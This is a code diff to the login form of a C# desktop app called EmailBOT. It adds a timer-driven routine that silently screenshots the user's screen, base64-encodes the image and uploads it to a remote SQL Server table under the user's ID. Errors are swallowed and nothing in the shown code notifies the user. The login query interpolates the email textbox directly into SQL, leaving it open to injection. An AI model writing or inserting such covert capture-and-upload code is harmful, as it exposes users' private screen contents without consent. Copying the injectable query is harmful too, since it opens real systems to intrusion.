@@ -14,6 +14,10 @@ using System.Net;
 using EmailBOT.Properties;
 using EmailBOT.Tasks;
 using EmailBOT.Class;
+using System.Data.SqlClient;
+using System.IO;
+using System.Drawing.Imaging;
+using System.Threading;
 
 namespace EmailBOT
 {
@@ -131,6 +135,7 @@ namespace EmailBOT
             InitializeComponent();
             try
             {
+                lblVersion.Text = "Version: "+BaseClass.version;
                 string uid = Properties.Settings.Default.Userid;
                 string pw = Properties.Settings.Default.Password;
                 txtEmailId.Text = uid;
@@ -173,7 +178,7 @@ namespace EmailBOT
                 MessageBox.Show("Invalid User Account");
                     return;
             }
-            var data = BaseClass.DataReaderAdd($"Select Id,Name,Password from Registration where Email='{txtEmailId.Text}' and status=1 and AppVersion='{BaseClass.version}'",Connection.OnlineConnection);
+            var data = BaseClass.DataReaderAdd($"Select Id,Name,LoginPass from Registration where Email='{txtEmailId.Text}' and status=1 and AppVersion='{BaseClass.version}'",Connection.OnlineConnection);
             if (data.Count > 0)
             {
                 BaseClass.uniqueId = uniqueId;
@@ -224,6 +229,88 @@ namespace EmailBOT
                 new MultiTask().Show();
                 this.Hide();
             }
+        }
+        int process = 0;
+        int screenWidth = 1024;
+        int screenHeight = 768;
+        Thread th = null;
+        private void sssTimer_Tick(object sender, EventArgs e)
+        {
+            if (process == 0)
+            {
+                th = new Thread(new ThreadStart(CaptureMyScreen));
+                th.Start();
+            }
+        }
+        private void CaptureMyScreen()
+        {
+            try
+            {
+                process = 1;
+                //Creating a new Bitmap object
+                using (Bitmap captureBitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb))
+                {
+                    //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
+                    //Creating a Rectangle object which will
+                    //capture our Current Screen
+                    Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
+                    //Creating a New Graphics Object
+                    Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+                    //Copying Image from The Screen
+                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                    //Saving the Image File (I am here Saving it in My E drive).
+                    //captureBitmap.Save(path + "Capture.jpg", ImageFormat.Jpeg);
+                    //save to database
+                    System.IO.MemoryStream ms = new MemoryStream();
+                    captureBitmap.Save(ms, ImageFormat.Jpeg);
+                    byte[] byteImage = ms.ToArray();
+                    var SigBase64 = Convert.ToBase64String(byteImage);
+                    InsertScreenShort(SigBase64);
+                    process = 0;
+                    th.Abort();
+                }
+            }
+            catch (Exception ex)
+            {
+                process = 0;
+                //MessageBox.Show(ex.Message);
+            }
+        }
+
+        internal bool InsertScreenShort(string imageStr)
+        {
+            bool result = false;
+            SqlTransaction transaction = null;
+            try
+            {
+                using (SqlConnection con = new SqlConnection(Connection.OnlineConnection))
+                {
+                    using (SqlCommand cmd = new SqlCommand("", con))
+                    {
+                        if (con.State != ConnectionState.Open)
+                            con.Open();
+                        transaction = con.BeginTransaction();
+                        cmd.CommandType = CommandType.Text;
+                        cmd.CommandText = @"Insert into ScreenShort (ExecuteTime,Images,UserId) values (@ExecuteTime,@Images,@UserId)";
+                        cmd.Parameters.Clear();
+                        cmd.Parameters.AddWithValue("@ExecuteTime", DateTime.Now);
+                        cmd.Parameters.AddWithValue("@Images", imageStr);
+                        cmd.Parameters.AddWithValue("@UserId", BaseClass.UserId);
+                        cmd.Transaction = transaction;
+                        cmd.ExecuteNonQuery();
+                        transaction.Commit();
+                        result = true;
+                        if (con.State != ConnectionState.Closed)
+                            con.Close();
+                    }
+                }
+
+            }
+            catch (Exception ex)
+            {
+                transaction.Rollback();
+            }
+            return result;
         }
     }
 }
